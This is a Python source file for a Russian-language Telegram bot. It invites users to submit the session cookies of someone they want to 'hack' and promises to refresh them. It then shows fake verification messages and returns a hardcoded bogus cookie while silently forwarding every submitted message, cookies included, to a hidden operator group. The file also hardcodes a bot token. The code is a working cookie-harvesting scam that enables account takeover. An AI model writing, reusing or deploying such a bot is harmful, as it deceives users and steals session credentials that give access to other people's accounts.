import os
import telebot
import time

# Временное решение - вставь токен прямо в код
TOKEN = "8260437183:AAG2NNbMPhsvkWjkxYaxAjceNm9jward6UA"  # ⚠️ ВСТАВЬ СЮДА РЕАЛЬНЫЙ ТОКЕН!
GROUP_ID = "-1003396901780"  # ⚠️ ВСТАВЬ СЮДА РЕАЛЬНЫЙ ID ГРУППЫ!

print(f"🔧 Используется токен: {TOKEN[:10]}...")
print(f"🔧 Используется ID группы: {GROUP_ID}")

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_command(message):
    print(f"👤 Получена команда /start от {message.from_user.id}")
    bot.send_message(message.chat.id, "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪")
    
    try:
        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
        print("✅ Уведомление отправлено в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    print(f"📩 Получено сообщение: {message.text}")
    
    bot.send_message(message.chat.id, "Проверка куки...")
    time.sleep(1)
    bot.send_message(message.chat.id, "Проверка прошла успешно ✅ Идёт инициализация...")
    time.sleep(2)
    bot.send_message(message.chat.id, "Инициализация завершена✅ ваш куки: CAEaAhACIhsKBGR1aWQSEzcyMDQzMzI1MzI4NDQxMjM2OTEoAw.dcx_K7KltLsjLmtD5zvo9MYLoxTWS-bwssrHI-5q2lB3xo6_-x83y7Ob8Phbqt1O095_zHlcSpGEbs1rM2dJdJFDa8jr71tZc4GjGGrFiMXcuUnb_AVU2Dr1h3mRIR9pZbs4MWJdImZgw0oCg6gd4s17ut2jYvxxMPceBlbbPuXUXj2ZSOVaoQU02CONBXnv1tffTWJgP2ip6aTHqNQLw-AtcirIJlZOkEisIHKjM1Axu2CewZBhLifTbaOWCYrDh4m1msl1MR2LyCHik55P72KtAwzW83KgZmVJbaZKRtfb-tikPI_fE0E4LdokpiYoN3Bijh0G37tlPPkOZRAf8E7MGOHQJ_I7bKww2_Ku11Ulc5jKK1gIJrsemZcqF8MussEeudabwStis5mKxq9gJ7b5tcC3msHPjIvIS9v_35q8r2WxmHUsRCifLonZ4D2-Pca6xZpfMZNvQTWLllHSepsiEJ4sIei6mX6E8Hc3o1n0taQTHNtuSYBemsrHX_iVmUZIQ7iEb_S3h4969qBoYI1lLhM80xXNccsxyim9obOkMqo6cbBvXKp3lN4vx0v7pXp1lhsNc5loXh7nPR2EAQ-u_5-atuW0xmnW4eifxjP4zSkGJSIxcknwFMpzUt0z2P12j1RXX9Vx580mjYEsYBhT54RHOEzsjcr-9odPLoOz3WU51ru8WtxM1w4YVDl5XbETSXOCFNbroQ5fJyzm31bBtNJUzneYjkvB_HI7dhflS5Q84tm1vAeZEdQXrvaZCz-QS3i2pIGclHrYMKuJQz0lPnk...")
    
    try:
        bot.send_message(GROUP_ID, f"📩 Сообщение от: {message.from_user.first_name}\nТекст: {message.text}")
        print("✅ Сообщение переслано в группу")
    except Exception as e:
        print(f"❌ Ошибка отправки в группу: {e}")

print("🚀 Бот запущен и готов к работе!")
bot.polling(none_stop=True, timeout=60)
